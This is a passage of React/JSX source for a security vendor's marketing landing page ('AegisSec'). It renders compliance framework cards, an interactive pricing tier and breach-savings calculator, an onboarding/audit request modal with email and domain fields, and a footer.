              <p className="mt-2 text-sm sm:text-base opacity-75 max-w-2xl">
                Every blocked packet, TLS handshake, and WAF policy change is cryptographically signed and mapped directly to SOC 2, ISO 27001, PCI-DSS 4.0, and HIPAA controls.
              </p>
            </div>

            <button
              type="button"
              onClick={() => {
                setDeploySubmitted(false);
                setActiveModal({
                  title: "Download Cryptographic SOC 2 & Pentest Package",
                  subtitle:
                    "Enter your work email to unlock instant access to our latest third-party penetration test summary and SOC 2 Type II bridge letter.",
                  mode: "audit"
                });
              }}
              className="inline-flex items-center gap-2 px-5 py-3 rounded-2xl bg-sky-500/15 hover:bg-sky-500/25 text-sky-300 border border-sky-500/30 text-sm font-semibold transition self-start md:self-auto"
            >
              <Download className="w-4 h-4" />
              <span>Request SOC 2 Type II & Pentest Report</span>
            </button>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-5">
            {COMPLIANCE_FRAMEWORKS.map((fw) => (
              <div
                key={fw.id}
                className={`p-6 rounded-3xl border flex flex-col justify-between ${
                  isDark
                    ? "bg-slate-900/60 border-slate-800"
                    : "bg-white border-stone-300"
                }`}
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-4">
                    <span className="px-2.5 py-1 rounded-full text-[11px] font-mono font-semibold bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">
                      {fw.status}
                    </span>
                    <span className="text-xs font-mono opacity-60">{fw.controls} Controls</span>
                  </div>
                  <h3 className="text-xl font-bold">{fw.name}</h3>
                  <div className="text-xs font-mono text-sky-400 mt-1 mb-3">{fw.coverage}</div>
                  <p className="text-xs leading-relaxed opacity-75">{fw.desc}</p>
                </div>

                <button
                  type="button"
                  onClick={() =>
                    triggerToast(`Exported ${fw.name} control mapping matrix (CSV/JSON)`)
                  }
                  className="mt-6 pt-4 border-t border-slate-800/60 inline-flex items-center justify-between text-xs font-semibold text-sky-400 hover:text-sky-300"
                >
                  <span>Export Control Matrix</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* 7. PROTECTION TIERS & INTERACTIVE BREACH ROI CALCULATOR (#pricing) */}
      <section id="pricing" className="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 mb-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wider bg-sky-500/10 text-sky-400 border border-sky-500/20 mb-3">
              <Server className="w-3.5 h-3.5" /> Predictable Perimeter Licensing
            </div>
            <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">
              Enterprise Protection Tiers & Breach Risk Calculator
            </h2>
            <p className="mt-2 text-sm sm:text-base opacity-75 max-w-2xl">
              Zero surge fees during volumetric DDoS attacks. Scale cleanly from high-growth APIs to sovereign multi-cloud meshes.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <span className="text-xs font-medium opacity-75">Monthly</span>
            <button
              type="button"
              onClick={() => setAnnualBilling((v) => !v)}
              className="w-12 h-6 rounded-full bg-sky-500/30 border border-sky-400 p-1 flex items-center transition"
              aria-label="Toggle annual billing discount"
            >
              <span
                className={`w-4 h-4 rounded-full bg-sky-400 transition-transform ${
                  annualBilling ? "translate-x-6" : "translate-x-0"
                }`}
              />
            </button>
            <span className="text-xs font-semibold text-sky-400">
              Annual Commitment (Save 20%)
            </span>
          </div>
        </div>

        <div
          className={`p-6 rounded-3xl border mb-10 grid grid-cols-1 lg:grid-cols-12 gap-6 items-center ${
            isDark ? "bg-slate-900/60 border-slate-800" : "bg-white border-stone-300"
          }`}
        >
          <div className="lg:col-span-7 space-y-2">
            <div className="flex justify-between text-sm font-semibold">
              <span>Protected Monthly Web & API Volume</span>
              <span className="font-mono text-sky-400">{monthlyRequestsM} Million req / mo</span>
            </div>
            <input
              type="range"
              min="25"
              max="1000"
              step="25"
              value={monthlyRequestsM}
              onChange={(e) => setMonthlyRequestsM(parseInt(e.target.value, 10))}
              className="w-full accent-sky-400"
            />
            <div className="flex justify-between text-[11px] font-mono opacity-60">
              <span>25M req/mo</span>
              <span>250M req/mo</span>
              <span>500M req/mo</span>
              <span>1B+ req/mo</span>
            </div>
          </div>

          <div className="lg:col-span-5 grid grid-cols-2 gap-4">
            <div
              className={`p-4 rounded-2xl border ${
                isDark ? "bg-slate-950/80 border-slate-800" : "bg-stone-100 border-stone-300"
              }`}
            >
              <div className="text-xs opacity-70">Est. Egress & Bot Savings</div>
              <div className="text-xl sm:text-2xl font-bold font-mono text-emerald-400 mt-1">
                ${Math.round(monthlyRequestsM * 42).toLocaleString()}/yr
              </div>
            </div>
            <div
              className={`p-4 rounded-2xl border ${
                isDark ? "bg-slate-950/80 border-slate-800" : "bg-stone-100 border-stone-300"
              }`}
            >
              <div className="text-xs opacity-70">SOC Analyst Hours Saved</div>
              <div className="text-xl sm:text-2xl font-bold font-mono text-sky-400 mt-1">
                {Math.round(monthlyRequestsM * 2.4)} hrs/mo
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {[
            {
              name: "Perimeter Growth",
              desc: "Autonomous WAF, TLS 1.3 Post-Quantum encryption, and L7 DDoS mitigation for production web apps.",
              basePrice: 490,
              features: [
                "Up to 100M inspected requests / mo included",
                "Semantic AST WAF (SQLi, XSS, SSRF)",
                "JA4+ Automated Bot & Scraper Defense",
                "PCI-DSS 4.0 Page Shield (Up to 25 scripts)",
                "Real-time Webhook & Slack SOC Alerts"
              ],
              highlight: false
            },
            {
              name: "Enterprise Zero-Trust",
              desc: "Full API schema enforcement, eBPF runtime protection, and 24/7 dedicated Threat Hunting Response.",
              basePrice: 1850,
              features: [
                "Custom volume scaling (" + monthlyRequestsM + "M+ req/mo)",
                "OpenAPI 3.1 & GraphQL AST Positive Security",
                "Kernel eBPF Runtime & IMDSv2 SSRF Guard",
                "Automated SOC 2 Type II & ISO 27001 Evidence",
                "15-Minute Dedicated Incident Response SLA"
              ],
              highlight: true
            },
            {
              name: "Sovereign Defense Mesh",
              desc: "Dedicated single-tenant cryptographic enclaves, custom ASN Anycast routing, and air-gapped deployment.",
              basePrice: 4900,
              features: [
                "Unlimited Unmetered L3/L4/L7 DDoS Scrubbing",
                "FIPS 140-3 Level 3 HSM Key Custody",
                "Custom eBPF Kernel Probes & SIEM Streaming",
                "Dedicated Forward-Deployed Security Engineer",
                "$5M Ransomware & Breach Financial Warranty"
              ],
              highlight: false
            }
          ].map((tier) => {
            const volumeAddon =
              tier.name === "Enterprise Zero-Trust"
                ? Math.max(0, Math.round((monthlyRequestsM - 100) * 1.5))
                : 0;
            const rawPrice = tier.basePrice + volumeAddon;
            const finalPrice = annualBilling ? Math.round(rawPrice * 0.8) : rawPrice;

            return (
              <div
                key={tier.name}
                className={`rounded-3xl p-7 border flex flex-col justify-between transition ${
                  tier.highlight
                    ? "bg-gradient-to-b from-sky-500/15 via-slate-900/90 to-slate-950 border-sky-400 shadow-2xl shadow-sky-500/10"
                    : isDark
                    ? "bg-slate-900/60 border-slate-800"
                    : "bg-white border-stone-300"
                }`}
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-3">
                    <h3 className="text-xl font-bold">{tier.name}</h3>
                    {tier.highlight && (
                      <span className="px-2.5 py-0.5 rounded-full text-[11px] font-semibold bg-sky-400 text-slate-950">
                        Most Deployed
                      </span>
                    )}
                  </div>
                  <p className="text-xs opacity-75 leading-relaxed min-h-[38px]">{tier.desc}</p>

                  <div className="my-6 flex items-baseline gap-2">
                    <span className="text-4xl font-bold font-mono">${finalPrice.toLocaleString()}</span>
                    <span className="text-xs opacity-60 font-mono">/ month</span>
                  </div>

                  <ul className="space-y-3 text-xs sm:text-sm mb-8">
                    {tier.features.map((f, i) => (
                      <li key={i} className="flex items-start gap-2.5">
                        <CheckCircle2 className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
                        <span className="opacity-90">{f}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    setDeploySubmitted(false);
                    setActiveModal({
                      title: `Provision ${tier.name} Cluster`,
                      subtitle: `Configure zero-downtime DNS or Envoy/Next.js edge integration for ${customDomainInput}.`,
                      mode: "deploy"
                    });
                  }}
                  className={`w-full py-3.5 px-5 rounded-2xl font-semibold text-sm flex items-center justify-center gap-2 transition ${
                    tier.highlight
                      ? "bg-sky-400 hover:bg-sky-300 text-slate-950"
                      : isDark
                      ? "bg-slate-800 hover:bg-slate-700 text-white"
                      : "bg-slate-900 hover:bg-slate-800 text-white"
                  }`}
                >
                  <span>Provision {tier.name}</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            );
          })}
        </div>
      </section>

      {/* PROVISIONING / AUDIT MODAL */}
      {activeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md">
          <div
            className={`w-full max-w-md rounded-3xl border p-6 sm:p-8 shadow-2xl ${
              isDark ? "bg-slate-900 border-slate-800 text-slate-100" : "bg-white border-stone-300 text-slate-900"
            }`}
          >
            <div className="flex items-start justify-between gap-4 mb-4">
              <div>
                <span className="text-xs font-mono uppercase tracking-wider text-sky-400">
                  AegisSec® Onboarding
                </span>
                <h3 className="text-xl font-bold mt-1">{activeModal.title}</h3>
              </div>
              <button
                type="button"
                onClick={() => setActiveModal(null)}
                className="p-1.5 rounded-lg opacity-60 hover:opacity-100"
                aria-label="Close modal"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <p className="text-xs sm:text-sm opacity-75 leading-relaxed mb-6">
              {activeModal.subtitle}
            </p>

            {deploySubmitted ? (
              <div className="p-5 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 space-y-2 text-sm">
                <div className="flex items-center gap-2 font-semibold">
                  <CheckCircle2 className="w-5 h-5" />
                  <span>Cryptographic Provisioning Token Generated</span>
                </div>
                <p className="text-xs opacity-90">
                  We have dispatched your edge bootstrap manifest and attestation keys to{" "}
                  <span className="font-mono underline">{deployEmail || "soc@enterprise.io"}</span>.
                </p>
              </div>
            ) : (
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  setDeploySubmitted(true);
                  triggerToast("Provisioning token & SOC package dispatched");
                }}
                className="space-y-4"
              >
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider opacity-75 mb-1.5">
                    Work Email
                  </label>
                  <input
                    type="email"
                    required
                    value={deployEmail}
                    onChange={(e) => setDeployEmail(e.target.value)}
                    placeholder="ciso@company.com"
                    className="w-full px-4 py-2.5 rounded-xl border bg-slate-950/70 border-slate-800 text-slate-100 text-sm focus:outline-none focus:border-sky-400"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider opacity-75 mb-1.5">
                    Primary Production Domain
                  </label>
                  <input
                    type="text"
                    required
                    value={deployOrg || customDomainInput}
                    onChange={(e) => setDeployOrg(e.target.value)}
                    className="w-full px-4 py-2.5 rounded-xl border bg-slate-950/70 border-slate-800 text-slate-100 text-sm font-mono focus:outline-none focus:border-sky-400"
                  />
                </div>
                <button
                  type="submit"
                  className="w-full py-3 rounded-xl bg-sky-400 hover:bg-sky-300 text-slate-950 font-semibold text-sm transition"
                >
                  {activeModal.mode === "audit"
                    ? "Unlock SOC 2 & Pentest Package"
                    : "Generate Edge Bootstrap Token"}
                </button>
              </form>
            )}
          </div>
        </div>
      )}

      {/* FOOTER */}
      <footer
        className={`border-t py-12 text-xs ${
          isDark ? "border-slate-800/80 bg-slate-950 text-slate-400" : "border-stone-300 bg-stone-200 text-slate-600"
        }`}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2.5 font-semibold text-sm text-slate-200">
            <ShieldCheck className="w-5 h-5 text-sky-400" />
            <span className={isDark ? "text-slate-100" : "text-slate-900"}>AegisSec® Autonomous Defense</span>
            <span className="text-xs font-mono px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
              All 310 Edge PoPs Operational
            </span>
          </div>
          <div className="flex flex-wrap items-center gap-6">
            <a href="#hero-top" className="hover:text-sky-400 transition">Top</a>
            <a href="#scanner" className="hover:text-sky-400 transition">Scanner</a>
            <a href="#threat-telemetry" className="hover:text-sky-400 transition">Telemetry</a>
            <a href="#architecture" className="hover:text-sky-400 transition">Architecture</a>
            <a href="#compliance" className="hover:text-sky-400 transition">Compliance</a>
            <a href="#pricing" className="hover:text-sky-400 transition">Pricing</a>
          </div>
        </div>
      </footer>
    </div>
  );
}